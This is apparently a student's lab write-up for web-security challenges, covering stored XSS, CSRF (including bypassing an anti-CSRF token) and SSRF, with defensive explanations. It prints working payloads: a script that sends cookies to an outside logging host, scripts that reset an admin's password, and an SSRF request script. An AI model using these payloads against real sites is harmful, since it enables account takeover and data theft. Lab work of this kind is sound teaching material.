# SLH lab 1

## 2 Basic CSRF

### 2.1. The website is also vulnerable to an XSS. How can you detect it?

Using *pipedream.com*, we log the requests that are sent to `https://eobnzz43rvm4g8a.m.pipedream.net`

In the contact form, we send this message :

```
<script>window.location.href = "https://eobnzz43rvm4g8a.m.pipedream.net?bonjour=bonjour";</script>
```

In pipedream we see that a request was received with the param `bonjour=bonjour`, so we know that the script in our message was sent by the vulnerable server to the admin.

### 2.2. Try to exfiltrate the admin cookie with the XSS. It does not work because of http-only. Explain what is http-only and how it prevents the exfiltration.

In the contact form, we send this message :

```
<script>window.location.href = "https://eobnzz43rvm4g8a.m.pipedream.net?cookie="+document.cookie;</script>
```

But we don't receive anything in pipedream.

Http-only is a flag that the server can set when giving a cookie to a client. A http-only cookie will be provided by the client when it sends requests to the server, but is not accessible by the javascript executed by the client.

Consequentially, even if an attacker is able to control the javascript that is executed by a client, the attacker script will not be able to access the cookie.

### 2.3. The website is also vulnerable to a CSRF. Which script is vulnerable?

The script on the server for changing the password. When changing password, the client simply sends a POST request with his session cookie and the new password.

### 2.4. What is the flag of this challenge?

`f_J[w[4LY^^N7*Xe`

### 2.5. How did you obtain the flag? Describe clearly your attack. In particular, explain where the XSS is and what type of XSS it is

The XSS is in the contact form. If we send javascript code in this form, it will be sent back to the admin when he displays the message. This is a stored XSS.

Using our own account, we change our password to "1234" and display the POST request using the developer tools.

We see that
- The request is sent to `/profile/damien.maier@heig-vd.ch`
- The request has a header `Content-type: application/x-www-form-urlencoded`
- The POST payload is `password=1234`

In the contact form, we send this message :
```html
<script>
    const TARGET_ACCOUNT = 'damien.maier@heig-vd.ch_admin'
    const NEW_PASSWORD = '1234'
    
    const url = '/profile/' + TARGET_ACCOUNT
    
    fetch(url, {
        method: 'POST',
        body: `password=${NEW_PASSWORD}`,
        headers:{'Content-type': "application/x-www-form-urlencoded"}
    })
</script>
```
When displaying the message, the admin browser will execute this script. The script sends a POST request with the appropriate header and payload to set the admin password to "1234".
As the script is executed in the admin's browser, the POST request will be sent with the session cookie of the admin.

## 3 More Advanced CSRF
### 3.1. What is an anti-CSRF token? Explain in details how it works.
An anti-CSRF token is a mitigation against CSRF attacks.

When a user visits a webpage that allows him or her to perform some sensitive action, like changing his or her password, the server provides an anti-CSRF token along with the webpage. The anti-CSRF token is a randomized value that is unique to the user.

When the user performs the sensitive action, his browser sends back the anti-CSRF token along with the sensitive request, to prove that the request is legitimate. When the server receives the request, it checks that the anti-CSRF token has the correct value, and refuses to perform the sensitive action if this is not the case.

Thanks to this mechanism, it is not possible, or at least more difficult, for an attacker to perform a CSRF attack against the website. If the attacker is able to make the victim user send a sensitive request to the server, the request does not contain a valid anti-CSRF token, and it is not accepted by the server.

### 3.2. How do you see that the form is protected with an anti-CSRF token?

When I change my password, the POST request that my browser send contains `_csrf=` followed by a random string.

If I send a custom request for changing my password without the anti-CSRF token, the server sends back an error and my password is not changed.
### 3.3. The website is also vulnerable to an XSS. What is the flag of this challenge?
`^Ykp}q]S75@Q(sc_`

### 3.4. How did you obtain the flag? Describe clearly your attack.

In the contact for, I send the following message :
```html
<script>
    const TARGET_ACCOUNT = 'damien.maier@heig-vd.ch_admin'
    const NEW_PASSWORD = 'abc'
    
    const url = '/profile/' + TARGET_ACCOUNT
    
    fetch(url)
      .then(response => response.text())
      .then(htmlContent => {
        const doc = new DOMParser().parseFromString(htmlContent, 'text/html')
        return doc.getElementsByTagName('input')[1].value
      })
      .then(csrf_string => {
        fetch(url, {
          method: 'POST',
          body: `password=${NEW_PASSWORD}&_csrf=${csrf_string}`,
          headers:{'Content-type': "application/x-www-form-urlencoded"}
        })
      })
</script>
```

Thanks to the XSS, this javascript code is executed by the admin's browser.

The script :
- Sends a get request to the password change webpage
- Reads the anti-CSRF token from the webpage, it is located in the `value` attribute of the second `input` tag.
- Sends a POST request for changing the password, that contains the anti-CSRF token in the body.
- As the script is executed by the admin, his session cookie is sent with the requests and his password is modified.

### 3.5. How would you secure the website?

I would require the user to reauthenticate himself when changing his password, by providing his old password. The server would accept to change the password only if the request sent contains the old password.

Even if the attacker can use the XSS, if he does not know the victim user password he can not make the victim browser send a valid change password request.

## 4 SSRF

### 4.1. The flag is confidential, it should not be indexed by search engines robots. Where is the flag? How did you find this information?

By visiting `http://iict-mv310-slh:8082/robots.txt` we can see that the flat is at `http://iict-mv310-slh:8082/api/admin/flag`.

### 4.2. You are not allowed to access the flag. Exploit an SSRF to obtain it. What is the flag?

`SLH22{zfrHW42XZMgpoyvEk}`

### 4.3. How did you obtain the flag? Describe clearly your attack.

By reading the javascript code of the page I learn that the website provides two API endpoints, one for verifying the URL and one for sending a message.

The URL verification endpoint is at `http://iict-mv310-slh:8082/api/webhook/test`. It expects a POST request with a json payload of the form `{url: <url to test>}`.

When the endpoint receives a request from a client, it sends a request to the provided URL and expects to get back some json data. If it receives a json payload, its content is included in the response sent to the client.

I can therefore use the endpoint as a proxy, that makes requests to receive json data that is located at an arbitrary URL. As the server is allowed to read the flag, I request it to read it for me.

Here is a python script that performs the attack :

```python
import requests

result = requests.post(
    url='http://iict-mv310-slh:8082/api/webhook/test',
    json={'url': 'http://iict-mv310-slh:8082/api/admin/flag'}
)

print(result.text)
```
### 4.4. How would you prevent this attack?
- Segment the network, put the flag in the local network and the webserver in a DMZ, and do not allow the servers in the DMZ to get data from the local network.
- Modify the verification endpoint such that it does not forward the json data to the user.